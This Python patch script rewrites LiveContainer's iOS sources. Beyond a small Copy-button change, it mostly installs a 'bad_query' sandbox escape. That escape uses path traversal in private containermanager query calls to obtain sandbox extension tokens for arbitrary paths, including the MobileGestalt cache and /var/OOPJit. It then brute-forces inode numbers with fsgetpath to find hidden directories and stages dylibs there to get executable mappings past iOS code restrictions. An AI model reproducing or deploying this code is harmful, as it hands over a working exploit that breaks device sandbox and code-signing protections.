from pathlib import Path

# This patch runs after patch_oopjit_bad_query.py. It keeps the Copy action,
# replaces the simplified bad_query clone with upstream-compatible semantics,
# proves token issuance against the known MobileGestalt SystemGroup first, then
# enumerates hidden OOPJIT children using fsgetpath and retries token issuance.

# ---------------------------------------------------------------------------
# Copy button for the diagnostic alert.
# ---------------------------------------------------------------------------
view_path = Path("LiveContainerSwiftUI/Views/Settings/LCJITLessDiagnoseView.swift")
s = view_path.read_text()
old = '''            .alert("lc.common.error".loc, isPresented: $errorShow){
            } message: {
                Text(errorInfo)
            }
'''
new = '''            .alert("lc.common.error".loc, isPresented: $errorShow) {
                Button("lc.common.copy".loc) {
                    UIPasteboard.general.string = errorInfo
                }
                Button("OK", role: .cancel) {}
            } message: {
                Text(errorInfo)
            }
'''
if "UIPasteboard.general.string = errorInfo" not in s:
    if old not in s:
        raise SystemExit("Unable to locate JIT-less error alert for Copy-button patch")
    s = s.replace(old, new, 1)
view_path.write_text(s)

# ---------------------------------------------------------------------------
# Common upstream-compatible bad_query replacement.
# ---------------------------------------------------------------------------
BAD_QUERY_REPLACEMENT = r'''static int64_t FlekBadQueryAcquirePathEx(const char *path,
                                             bool create,
                                             const char *groupIdentifier,
                                             bool isGroup) {
    if (!path || path[0] != '/') return -255;

    // Match upstream's create=false preflight semantics. Callers that are
    // probing a sandbox-hidden path deliberately use create=true so the query
    // itself decides whether containermanager can traverse to it.
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254;
    }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    FlekContainerQueryCreateFn queryCreate = (FlekContainerQueryCreateFn)dlsym(mgr, "container_query_create");
    FlekContainerQuerySetClassFn querySetClass = (FlekContainerQuerySetClassFn)dlsym(mgr, "container_query_set_class");
    FlekContainerQuerySetIdentifiersFn querySetIdentifiers = (FlekContainerQuerySetIdentifiersFn)dlsym(mgr, "container_query_set_group_identifiers");
    FlekContainerQuerySetFlagsFn querySetFlags = (FlekContainerQuerySetFlagsFn)dlsym(mgr, "container_query_operation_set_flags");
    FlekContainerQuerySetPartFn querySetPart = (FlekContainerQuerySetPartFn)dlsym(mgr, "container_query_operation_set_part");
    FlekContainerQuerySetPartDomainFn querySetPartDomain = (FlekContainerQuerySetPartDomainFn)dlsym(mgr, "container_query_operation_set_part_domain");
    FlekContainerQueryGetSingleResultFn queryGetSingleResult = (FlekContainerQueryGetSingleResultFn)dlsym(mgr, "container_query_get_single_result");
    FlekContainerQueryFreeFn queryFree = (FlekContainerQueryFreeFn)dlsym(mgr, "container_query_free");
    FlekContainerCopySandboxTokenFn copySandboxToken = (FlekContainerCopySandboxTokenFn)dlsym(mgr, "container_copy_sandbox_token");
    FlekSandboxExtensionConsumeFn consumeExtension = (FlekSandboxExtensionConsumeFn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!queryCreate || !querySetClass || !querySetIdentifiers || !querySetFlags ||
        !querySetPart || !querySetPartDomain || !queryGetSingleResult ||
        !queryFree || !copySandboxToken || !consumeExtension) {
        dlclose(mgr);
        return -1;
    }

    void *query = queryCreate();
    if (!query) {
        dlclose(mgr);
        return -2;
    }

    xpc_object_t identifier = NULL;
    if (groupIdentifier == NULL) {
        // Upstream class 13 -> containermanagerd_system using MobileGestalt's
        // shared SystemGroup as the traversal origin.
        querySetClass(query, 13);
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        querySetClass(query, 7);
        identifier = xpc_string_create(groupIdentifier);
    }
    if (!identifier) {
        queryFree(query);
        dlclose(mgr);
        return -2;
    }

    querySetIdentifiers(query, identifier);
    querySetPart(query, 3); // Library/Caches

    char *part = NULL;
    const char *traversal = groupIdentifier == NULL
        ? "../../../../../../../..%s"
        : "../../../../../../../../..%s";
    if (asprintf(&part, traversal, path) == -1 || !part) {
        xpc_release(identifier);
        queryFree(query);
        dlclose(mgr);
        return -5;
    }
    querySetPartDomain(query, part);
    querySetFlags(query, isGroup ? 0x0000000800000000ULL : 0x0000008000000000ULL);

    void *result = queryGetSingleResult(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        queryFree(query);
        dlclose(mgr);
        return -3; // containermanager traversal produced no result
    }

    char *token = copySandboxToken(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        queryFree(query);
        dlclose(mgr);
        return -4; // kernel/service refused to issue a sandbox extension
    }

    int64_t handle = consumeExtension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    queryFree(query);
    dlclose(mgr);
    return handle;
}

static int64_t FlekBadQueryAcquirePath(const char *path) {
    // For hidden targets, skip the pre-query lstat exactly as upstream's
    // create=true mode does. This does not create the target by itself.
    return FlekBadQueryAcquirePathEx(path, true, NULL, false);
}

'''

def replace_bad_query_acquire(text: str, label: str) -> str:
    start = text.find("static int64_t FlekBadQueryAcquirePath(const char *path) {")
    end = text.find("static void FlekBadQueryReleasePath", start)
    if start == -1 or end == -1:
        raise SystemExit(f"Unable to locate simplified bad_query helper in {label}")
    return text[:start] + BAD_QUERY_REPLACEMENT + text[end:]

# ---------------------------------------------------------------------------
# Host-side hidden OOPJIT enumeration and staged token probe.
# ---------------------------------------------------------------------------
utils_path = Path("LiveContainerSwiftUI/Utilities/LCUtils.m")
utils = utils_path.read_text()
utils = replace_bad_query_acquire(utils, "LCUtils.m")

# Mond/upstream bad_query_list uses statfs + fsgetpath and falls back to /var
# when the requested parent is sandbox-hidden. Add the needed headers once.
if "#include <sys/mount.h>" not in utils:
    utils = utils.replace("#include <sys/stat.h>\n", "#include <sys/stat.h>\n#include <sys/mount.h>\n#include <sys/fsgetpath.h>\n", 1)

release_marker = '''static void FlekBadQueryReleasePath(int64_t handle) {
    if (handle < 0) return;
    FlekSandboxExtensionReleaseFn releaseExtension =
        (FlekSandboxExtensionReleaseFn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (releaseExtension) releaseExtension(handle);
}
'''
if release_marker not in utils:
    raise SystemExit("Host bad_query release helper marker missing")

enum_helpers = r'''

static NSArray<NSString *> *FlekBadQueryEnumerateChildren(const char *path, int64_t maxInode, NSString **statusOut) {
    struct statfs sfs;
    int statfsErr = 0;
    if (statfs(path, &sfs) != 0) {
        statfsErr = errno;
        // Match the hardened Mond fork: obtain the Data-volume fsid from a
        // reachable alias even when the target parent itself cannot be stat'd.
        if (statfs("/private/var", &sfs) != 0 && statfs("/var", &sfs) != 0 &&
            statfs(NSHomeDirectory().fileSystemRepresentation, &sfs) != 0) {
            if (statusOut) {
                *statusOut = [NSString stringWithFormat:@"fsgetpath setup failed target errno=%d (%s), fallback errno=%d (%s)",
                              statfsErr, strerror(statfsErr), errno, strerror(errno)];
            }
            return @[];
        }
    }

    fsid_t fsid = sfs.f_fsid;
    NSMutableOrderedSet<NSString *> *children = [NSMutableOrderedSet orderedSet];
    NSString *requested = [NSString stringWithUTF8String:path];
    NSString *normalized = [requested hasPrefix:@"/private/var/"]
        ? [requested substringFromIndex:8]
        : requested;
    const char *prefix = normalized.fileSystemRepresentation;
    size_t prefixLength = strlen(prefix);

    CFAbsoluteTime started = CFAbsoluteTimeGetCurrent();
    char buf[PATH_MAX];
    for (uint64_t ino = 1; ino <= (uint64_t)maxInode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        const char *p = buf;
        // fsgetpath may return /private/var/... while upstream bad_query's
        // public-facing paths commonly use /var/.... Normalize consistently.
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, prefix, prefixLength) != 0 || p[prefixLength] != '/') continue;
        const char *tail = p + prefixLength + 1;
        if (*tail == '\0' || strchr(tail, '/')) continue; // direct children only
        [children addObject:[NSString stringWithUTF8String:p]];
        if (children.count >= 64) break;
    }
    CFAbsoluteTime elapsed = CFAbsoluteTimeGetCurrent() - started;
    if (statusOut) {
        *statusOut = [NSString stringWithFormat:@"fsgetpath scanned=%lld children=%lu elapsed=%.3fs targetStatfsErr=%d",
                      (long long)maxInode, (unsigned long)children.count, elapsed, statfsErr];
    }
    return children.array;
}

static NSString *FlekBadQueryResultText(int64_t value) {
    switch (value) {
        case -255: return @"invalid path";
        case -254: return @"preflight lstat missing/blocked";
        case -5: return @"path traversal allocation failed";
        case -4: return @"sandbox token issuance rejected";
        case -3: return @"containermanager query returned no result";
        case -2: return @"query creation failed";
        case -1: return @"private API resolution failed";
        default: return value >= 0 ? @"TOKEN CONSUMED" : @"unknown failure";
    }
}
'''
utils = utils.replace(release_marker, release_marker + enum_helpers, 1)

method_start = '+ (void)validateJITLessSetupWithCompletionHandler:(void (^)(BOOL success, NSError *error))completionHandler {'
method_end = '+ (NSURL *)archiveIPAWithBundleName:'
start = utils.find(method_start)
end = utils.find(method_end, start)
if start == -1 or end == -1:
    raise SystemExit("Unable to locate host JIT-less diagnostic method")

new_validate = r'''+ (void)validateJITLessSetupWithCompletionHandler:(void (^)(BOOL success, NSError *error))completionHandler {
    extern void *SecTaskCreateFromSelf(CFAllocatorRef allocator);
    extern CFTypeRef SecTaskCopyValueForEntitlement(void *task, CFStringRef key, CFErrorRef *error);

    NSString *tmpRoot = NSTemporaryDirectory();
    [NSFileManager.defaultManager createDirectoryAtPath:tmpRoot withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *tmpLibPath = [tmpRoot stringByAppendingPathComponent:@"TestJITLess.dylib"];
    [NSFileManager.defaultManager removeItemAtPath:tmpLibPath error:nil];

    NSError *sourceCopyError = nil;
    [NSFileManager.defaultManager copyItemAtPath:
        [NSBundle.mainBundle.bundlePath stringByAppendingPathComponent:@"Frameworks/TestJITLess.dylib"]
                                           toPath:tmpLibPath
                                            error:&sourceCopyError];
    if (sourceCopyError) {
        completionHandler(NO, sourceCopyError);
        return;
    }

    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
    __block BOOL signSuccess = NO;
    __block NSError *signError = nil;
    [LCUtils signFilesWithZSignWithURLs:@[[NSURL fileURLWithPath:tmpLibPath]]
                      completionHandler:^(BOOL success, NSError *_Nullable error) {
        signSuccess = success;
        signError = error;
        dispatch_semaphore_signal(sema);
    }];
    dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);

    // The inode walk can be substantial; keep it off the UI thread. All final
    // SwiftUI state changes still arrive via completion on the main queue.
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableArray<NSString *> *report = [NSMutableArray array];
        NSMutableArray<NSNumber *> *consumedHandles = [NSMutableArray array];

        void (^finish)(BOOL, NSError *) = ^(BOOL success, NSError *error) {
            for (NSNumber *n in consumedHandles) FlekBadQueryReleasePath(n.longLongValue);
            [NSFileManager.defaultManager removeItemAtPath:tmpLibPath error:nil];
            dispatch_async(dispatch_get_main_queue(), ^{ completionHandler(success, error); });
        };

        if (!signSuccess) {
            finish(NO, signError);
            return;
        }
        if (!checkCodeSignature(tmpLibPath.UTF8String)) {
            NSError *e = [NSError errorWithDomain:NSBundle.mainBundle.bundleIdentifier
                                              code:1300
                                          userInfo:@{NSLocalizedDescriptionKey:
                                              @"bad_query bootstrap probe: signed test dylib failed signature validation."}];
            finish(NO, e);
            return;
        }

        void *task = SecTaskCreateFromSelf(NULL);
        CFErrorRef entitlementError = NULL;
        CFTypeRef loaderValue = task ? SecTaskCopyValueForEntitlement(
            task, CFSTR("com.apple.private.oop-jit.loader"), &entitlementError) : NULL;
        NSString *loader = nil;
        if (loaderValue && CFGetTypeID(loaderValue) == CFStringGetTypeID()) loader = [(__bridge NSString *)loaderValue copy];
        if (loaderValue) CFRelease(loaderValue);
        if (entitlementError) CFRelease(entitlementError);
        if (task) CFRelease((CFTypeRef)task);
        [report addObject:[NSString stringWithFormat:@"effective oop-jit.loader=%@", loader ?: @"<missing>"]];

        BOOL baselineMap = NO;
        [report addObject:FlekRawExecMapProbe(tmpLibPath, &baselineMap)];

        // STEP 1: prove bad_query itself can get a real token before asking it
        // to traverse into OOPJIT. This is the same MobileGestalt SystemGroup
        // origin used by upstream's demo.
        const char *knownPaths[] = {
            "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist",
            "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist",
            "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches",
            "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches"
        };
        int64_t bootstrapHandle = -999;
        NSString *bootstrapPath = nil;
        for (size_t i = 0; i < sizeof(knownPaths)/sizeof(knownPaths[0]); i++) {
            int64_t h = FlekBadQueryAcquirePathEx(knownPaths[i], true, NULL, false);
            [report addObject:[NSString stringWithFormat:@"bad_query bootstrap candidate=%s handle=%lld %@",
                               knownPaths[i], (long long)h, FlekBadQueryResultText(h)]];
            if (h >= 0) {
                [consumedHandles addObject:@(h)];
                if (bootstrapHandle < 0) {
                    bootstrapHandle = h;
                    bootstrapPath = [NSString stringWithUTF8String:knownPaths[i]];
                }
            }
        }
        [report addObject:[NSString stringWithFormat:@"bad_query bootstrapHandle=%lld path=%@",
                           (long long)bootstrapHandle, bootstrapPath ?: @"<none>"]];

        // STEP 2: prove what changed after the bootstrap extension, then expose
        // hidden direct children of OOPJIT with Mond/upstream's fsgetpath path.
        [report addObject:FlekProbePath("OOPJit /var before child tokens", "/var/OOPJit")];
        [report addObject:FlekProbePath("OOPJit /private before child tokens", "/private/var/OOPJit")];

        NSString *enumStatus = nil;
        NSArray<NSString *> *children = FlekBadQueryEnumerateChildren("/var/OOPJit", 2000000, &enumStatus);
        [report addObject:[NSString stringWithFormat:@"OOPJit enumeration: %@", enumStatus ?: @"<no status>"]];
        if (children.count == 0) {
            [report addObject:@"OOPJit children: <none discovered in inode scan>"];
        } else {
            [report addObject:[NSString stringWithFormat:@"OOPJit children: %@", [children componentsJoinedByString:@", "]]];
        }

        // STEP 3: token ladder. Try both path aliases, the historical previews
        // child, and every direct child fsgetpath found. Keep every successful
        // token alive until the executable-map test has finished.
        NSMutableOrderedSet<NSString *> *candidates = [NSMutableOrderedSet orderedSetWithArray:@[
            @"/var/OOPJit",
            @"/private/var/OOPJit",
            @"/var/OOPJit/previews",
            @"/private/var/OOPJit/previews"
        ]];
        for (NSString *child in children) {
            [candidates addObject:child];
            if ([child hasPrefix:@"/var/"]) [candidates addObject:[@"/private" stringByAppendingString:child]];
        }

        NSMutableArray<NSString *> *tokenBackedDirs = [NSMutableArray array];
        for (NSString *candidate in candidates) {
            int64_t h = FlekBadQueryAcquirePathEx(candidate.fileSystemRepresentation, true, NULL, false);
            [report addObject:[NSString stringWithFormat:@"bad_query OOPJit candidate=%@ handle=%lld %@",
                               candidate, (long long)h, FlekBadQueryResultText(h)]];
            if (h >= 0) {
                [consumedHandles addObject:@(h)];
                [tokenBackedDirs addObject:candidate];
                [report addObject:FlekProbePath(candidate.fileSystemRepresentation, candidate.fileSystemRepresentation)];
            }
        }

        // A root token may allow creating the loader child even when it did not
        // exist before the exploit. Try both aliases after all tokens are live.
        errno = 0;
        int mkVar = mkdir("/var/OOPJit/previews", 0700);
        int mkVarErr = mkVar == 0 ? 0 : errno;
        errno = 0;
        int mkPrivate = mkdir("/private/var/OOPJit/previews", 0700);
        int mkPrivateErr = mkPrivate == 0 ? 0 : errno;
        [report addObject:[NSString stringWithFormat:@"post-token mkdir previews /var=%d/%@ /private=%d/%@",
                           mkVar, FlekErrnoString(mkVarErr), mkPrivate, FlekErrnoString(mkPrivateErr)]];

        // STEP 4: find an actually writable token-backed OOPJIT directory by
        // staging the already-signed dylib. We do not assume "previews" exists.
        NSMutableOrderedSet<NSString *> *stageDirs = [NSMutableOrderedSet orderedSetWithArray:tokenBackedDirs];
        [stageDirs addObject:@"/var/OOPJit/previews"];
        [stageDirs addObject:@"/private/var/OOPJit/previews"];

        NSString *workingDir = nil;
        NSString *oopPath = nil;
        NSError *lastCopyError = nil;
        for (NSString *dir in stageDirs) {
            NSString *candidatePath = [dir stringByAppendingPathComponent:
                [NSString stringWithFormat:@"FlekDeck-TestJITLess-%d.dylib", getpid()]];
            [NSFileManager.defaultManager removeItemAtPath:candidatePath error:nil];
            NSError *copyError = nil;
            BOOL copied = [NSFileManager.defaultManager copyItemAtPath:tmpLibPath toPath:candidatePath error:&copyError];
            [report addObject:[NSString stringWithFormat:@"stage dir=%@ copy=%@ error=%@",
                               dir, copied ? @"PASS" : @"FAIL", copyError.localizedDescription ?: @"<none>"]];
            if (copied) {
                workingDir = dir;
                oopPath = candidatePath;
                break;
            }
            lastCopyError = copyError;
        }

        if (!oopPath) {
            NSString *reportText = [report componentsJoinedByString:@"\n"];
            [NSUserDefaults.standardUserDefaults setObject:reportText forKey:@"FlekOOPJITLastProbeReport"];
            NSError *e = [NSError errorWithDomain:NSBundle.mainBundle.bundleIdentifier
                                              code:1301
                                          userInfo:@{NSLocalizedDescriptionKey:
                [@"bad_query token/bootstrap completed but no OOPJIT staging directory became writable.\n"
                    stringByAppendingString:reportText]}];
            finish(NO, e);
            return;
        }

        [NSUserDefaults.standardUserDefaults setObject:workingDir forKey:@"FlekOOPJITWorkingDirectory"];

        BOOL oopMap = NO;
        [report addObject:FlekRawExecMapProbe(oopPath, &oopMap)];

        unsetenv("LC_JITLESS_TEST_LOADED");
        dlerror();
        void *handle = dlopen(oopPath.fileSystemRepresentation, RTLD_NOW | RTLD_LOCAL);
        const char *rawDlError = dlerror();
        NSString *dlError = rawDlError ? [NSString stringWithUTF8String:rawDlError] : nil;
        BOOL constructorRan = getenv("LC_JITLESS_TEST_LOADED") && strcmp(getenv("LC_JITLESS_TEST_LOADED"), "1") == 0;
        [report addObject:[NSString stringWithFormat:@"dlopen handle=%p constructor=%@ error=%@ workingDir=%@",
                           handle, constructorRan ? @"YES" : @"NO", dlError ?: @"<none>", workingDir]];
        if (handle) dlclose(handle);
        [NSFileManager.defaultManager removeItemAtPath:oopPath error:nil];

        NSString *reportText = [report componentsJoinedByString:@"\n"];
        [NSUserDefaults.standardUserDefaults setObject:reportText forKey:@"FlekOOPJITLastProbeReport"];

        if (!handle || !constructorRan) {
            NSError *e = [NSError errorWithDomain:NSBundle.mainBundle.bundleIdentifier
                                              code:1302
                                          userInfo:@{NSLocalizedDescriptionKey:
                [@"bad_query obtained/staged OOPJIT access but executable loading still failed.\n"
                    stringByAppendingString:reportText]}];
            finish(NO, e);
            return;
        }

        NSLog(@"[FlekDeck OOPJIT] PASS via %@", workingDir);
        finish(YES, nil);
    });
}

'''
utils = utils[:start] + new_validate + utils[end:]

for marker in (
    "bad_query bootstrapHandle=",
    "FlekBadQueryEnumerateChildren",
    "OOPJit children:",
    "FlekOOPJITWorkingDirectory",
):
    if marker not in utils:
        raise SystemExit(f"Host bootstrap/OOPJIT patch missing marker: {marker}")
utils_path.write_text(utils)

# ---------------------------------------------------------------------------
# Guest mapper: use upstream-compatible token calls, bootstrap the known-good
# SystemGroup first, try both OOPJIT aliases, and honor a working directory found
# by the host diagnostic.
# ---------------------------------------------------------------------------
dyld_path = Path("LiveContainer/Tweaks/Dyld.m")
dyld = dyld_path.read_text()
dyld = replace_bad_query_acquire(dyld, "Dyld.m")

old_globals = '''static int64_t gFlekOOPJITRootExtension = -999;
static int64_t gFlekOOPJITPreviewsExtension = -999;
'''
new_globals = '''static int64_t gFlekBadQueryBootstrapExtension = -999;
static int64_t gFlekOOPJITRootExtension = -999;
static int64_t gFlekOOPJITPrivateRootExtension = -999;
static int64_t gFlekOOPJITPreviewsExtension = -999;
static int64_t gFlekOOPJITPrivatePreviewsExtension = -999;
'''
if old_globals not in dyld:
    raise SystemExit("Guest OOPJIT global marker missing")
dyld = dyld.replace(old_globals, new_globals, 1)

ensure_start = dyld.find("static void FlekEnsureOOPJITBadQueryAccess(void) {")
ensure_end = dyld.find("}\n", ensure_start)
# Find the end of dispatch_once function robustly using the next double newline.
ensure_end = dyld.find("\n}\n", ensure_start)
if ensure_start == -1 or ensure_end == -1:
    raise SystemExit("Guest FlekEnsureOOPJITBadQueryAccess marker missing")
ensure_end += 3
new_ensure = r'''static void FlekEnsureOOPJITBadQueryAccess(void) {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        gFlekBadQueryBootstrapExtension = FlekBadQueryAcquirePathEx(
            "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist",
            true, NULL, false);
        gFlekOOPJITRootExtension = FlekBadQueryAcquirePathEx("/var/OOPJit", true, NULL, false);
        gFlekOOPJITPrivateRootExtension = FlekBadQueryAcquirePathEx("/private/var/OOPJit", true, NULL, false);
        gFlekOOPJITPreviewsExtension = FlekBadQueryAcquirePathEx("/var/OOPJit/previews", true, NULL, false);
        gFlekOOPJITPrivatePreviewsExtension = FlekBadQueryAcquirePathEx("/private/var/OOPJit/previews", true, NULL, false);
        NSLog(@"[FlekDeck OOPJIT] bad_query guest bootstrap=%lld root(var)=%lld root(private)=%lld previews(var)=%lld previews(private)=%lld",
              (long long)gFlekBadQueryBootstrapExtension,
              (long long)gFlekOOPJITRootExtension,
              (long long)gFlekOOPJITPrivateRootExtension,
              (long long)gFlekOOPJITPreviewsExtension,
              (long long)gFlekOOPJITPrivatePreviewsExtension);
    });
}
'''
dyld = dyld[:ensure_start] + new_ensure + dyld[ensure_end:]

mmap_start = dyld.find("void* jitless_hook_mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset) {")
mmap_end = dyld.find("static void *machOChainedFixupsValidLinkedit;", mmap_start)
if mmap_start == -1 or mmap_end == -1:
    raise SystemExit("Guest jitless_hook_mmap markers missing")
new_mmap = r'''void* jitless_hook_mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset) {
    void *map = __mmap(addr, len, prot, flags, fd, offset);
    if (map != MAP_FAILED || !(prot & PROT_EXEC) || fd < 0) return map;

    char filePath[PATH_MAX];
    if (fcntl(fd, F_GETPATH, filePath) != 0) return map;

    if (@available(iOS 27.0, *)) {
        FlekEnsureOOPJITBadQueryAccess();
        NSString *saved = [NSUserDefaults.standardUserDefaults stringForKey:@"FlekOOPJITWorkingDirectory"];
        NSMutableOrderedSet<NSString *> *dirs = [NSMutableOrderedSet orderedSet];
        if (saved.length > 0) [dirs addObject:saved];
        [dirs addObject:@"/var/OOPJit/previews"];
        [dirs addObject:@"/private/var/OOPJit/previews"];

        for (NSString *dir in dirs) {
            // If the host diagnostic discovered a different OOPJIT child, ask
            // bad_query for that exact path before trying the move/mmap.
            int64_t dynamicHandle = -999;
            if (![dir isEqualToString:@"/var/OOPJit/previews"] &&
                ![dir isEqualToString:@"/private/var/OOPJit/previews"]) {
                dynamicHandle = FlekBadQueryAcquirePathEx(dir.fileSystemRepresentation, true, NULL, false);
            }

            char oopTmpPath[PATH_MAX];
            snprintf(oopTmpPath, sizeof(oopTmpPath), "%s/flekdeck-%d-%p.dylib",
                     dir.fileSystemRepresentation, getpid(), addr);
            errno = 0;
            if (rename(filePath, oopTmpPath) == 0) {
                void *oopMap = __mmap(addr, len, prot, flags, fd, offset);
                int oopErr = oopMap == MAP_FAILED ? errno : 0;
                (void)rename(oopTmpPath, filePath);
                if (dynamicHandle >= 0) FlekBadQueryReleasePath(dynamicHandle);
                if (oopMap != MAP_FAILED) {
                    NSLog(@"[FlekDeck OOPJIT] guest executable mmap PASS via %@", dir);
                    return oopMap;
                }
                NSLog(@"[FlekDeck OOPJIT] guest mmap via %@ failed errno=%d (%s)", dir, oopErr, strerror(oopErr));
            } else {
                int renameErr = errno;
                NSLog(@"[FlekDeck OOPJIT] guest rename via %@ failed errno=%d (%s)", dir, renameErr, strerror(renameErr));
                if (dynamicHandle >= 0) FlekBadQueryReleasePath(dynamicHandle);
            }
        }
    }

    // Preserve upstream LiveContainer's original private-container fallback.
    const char *lpHome = getenv("LP_HOME_PATH");
    if (!lpHome) return map;
    char newTmpPath[PATH_MAX];
    snprintf(newTmpPath, sizeof(newTmpPath), "%s/Documents/%p.dylib", lpHome, addr);
    if (rename(filePath, newTmpPath) == 0) {
        map = __mmap(addr, len, prot, flags, fd, offset);
        (void)rename(newTmpPath, filePath);
    }
    return map;
}

'''
dyld = dyld[:mmap_start] + new_mmap + dyld[mmap_end:]
for marker in ("bad_query guest bootstrap=", "FlekOOPJITWorkingDirectory", "guest executable mmap PASS via"):
    if marker not in dyld:
        raise SystemExit(f"Guest bootstrap patch missing marker: {marker}")
dyld_path.write_text(dyld)

print("Applied Copy button + upstream bad_query bootstrap/token ladder + hidden OOPJIT enumeration")
